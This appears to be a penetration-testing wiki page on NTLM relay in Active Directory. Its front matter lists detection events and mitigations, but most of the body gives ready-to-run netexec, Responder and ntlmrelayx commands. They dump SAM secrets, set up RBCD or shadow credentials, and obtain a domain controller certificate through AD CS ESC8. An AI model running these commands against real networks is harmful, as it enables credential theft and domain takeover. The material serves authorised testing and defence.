---
title: NTLM relay
category: AD / Relay & Coercion
order: 10
tags: [ntlm, relay, mitm, ntlmrelayx, smb]
summary: >
  Forward a victim's NTLM authentication to a third service instead of cracking
  it. Works whenever the target service does not enforce signing/channel binding
  and the relayed principal has rights there.
prerequisites:
  - A victim authentication to capture or coerce (Responder, mitm6, PetitPotam, PrinterBug…)
  - A target service that does NOT enforce signing / EPA (SMB signing off, LDAP(S) without channel binding, HTTP CA, MSSQL…)
  - Network position between victim and target ($attacker_ip reachable by the victim)
tools: [impacket (ntlmrelayx), Responder, mitm6, netexec, krbrelayx]
detection:
  - Authentications where the source host ≠ the account's usual host
  - Event 4624/4625 logon from relay host; SMB sessions to many targets from one IP
  - Sudden LDAP writes (RBCD, shadow creds) right after a coerced auth
mitigation:
  - Enforce SMB signing everywhere; enable LDAP signing + channel binding (EPA)
  - Enable EPA on AD CS web endpoints; disable NTLM where possible
  - Disable LLMNR/NBT-NS/mDNS; block outbound 445; filter DHCPv6 (mitm6)
refs:
  - { label: "hackndo — NTLM relay", url: "https://en.hackndo.com/ntlm-relay/" }
  - { label: "HackTricks — Relay", url: "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/relaying-credentials" }
  - { label: "Impacket ntlmrelayx", url: "https://github.com/fortra/impacket" }
---

NTLM relay does not break the hash — it **passes the authentication through** to
another service in real time. If SMB signing (or LDAP channel binding, or HTTP
EPA) is not enforced, the relayed session inherits the victim's privileges on
the target.

> This page is the overview. For depth see **Relay matrix** (what protocol can be
> relayed to what, and the signing/EPA/MIC gates), **WebDAV relay** (turn SMB
> coercion into relayable HTTP), and the **ntlmrelayx cookbook** (SOCKS, exec,
> LDAP/ADCS recipes).

The single most important rule: **you cannot relay an authentication back to the
host it came from** (reflection is patched), and the *source* protocol decides
where you can go — SMB-sourced auth is signed and usually can't reach LDAP, while
HTTP-sourced auth (WebDAV/WPAD) relays cleanly to LDAP and AD CS.

## Find where you can relay

Signing is the gate. Enumerate targets whose SMB signing is **not required**:

```sh
# hosts with SMB signing disabled/optional = relay candidates
netexec smb $ip/24 --gen-relay-list relay_targets.txt
netexec smb $ip/24 -u '' -p '' | grep -i "signing:False"
```

## Trigger an authentication

You need a victim to authenticate to you. Any of:

- **Responder** — poison LLMNR/NBT-NS/mDNS (turn its own SMB/HTTP servers OFF so they don't answer, let ntlmrelayx take it).
- **mitm6** — spoof DHCPv6/WPAD to funnel HTTP NTLM.
- **Coercion** — PetitPotam / PrinterBug / DFSCoerce (see their pages) to force a computer account to auth to `$attacker_ip`.

```sh
# Responder configured to only poison (SMB/HTTP servers OFF in Responder.conf)
responder -I $interface
```

## Relay it

### To SMB (command execution / secrets)

```sh
# relay to SMB targets; dump SAM on any where the relayed user is local admin
ntlmrelayx.py -tf relay_targets.txt -smb2support --dump-sam
# or get a SOCKS session to reuse the authenticated session interactively
ntlmrelayx.py -tf relay_targets.txt -smb2support -socks
```

### To LDAP / LDAPS (RBCD, Shadow Creds, dump)

Relaying a **computer** account (from coercion) to LDAP lets you configure
Resource-Based Constrained Delegation or add Shadow Credentials on it.

```sh
# escalate via RBCD: delegate from a computer you control ($computer)
ntlmrelayx.py -t ldaps://$dc_ip --delegate-access --escalate-user $computer
# add shadow credentials (msDS-KeyCredentialLink) on the relayed victim
ntlmrelayx.py -t ldaps://$dc_ip --shadow-credentials --shadow-target $target_user
```

### To AD CS HTTP endpoint (ESC8) → DA-worthy cert

```sh
# relay a coerced DC$ to the CA web enrollment, get a cert for the DC
ntlmrelayx.py -t http://$dc_host/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController
```

> After ESC8 you hold a certificate for the coerced machine — request a TGT with
> it (Rubeus/gettgtpkinit) and DCSync. See **ADCS ESC8** and **PetitPotam**.
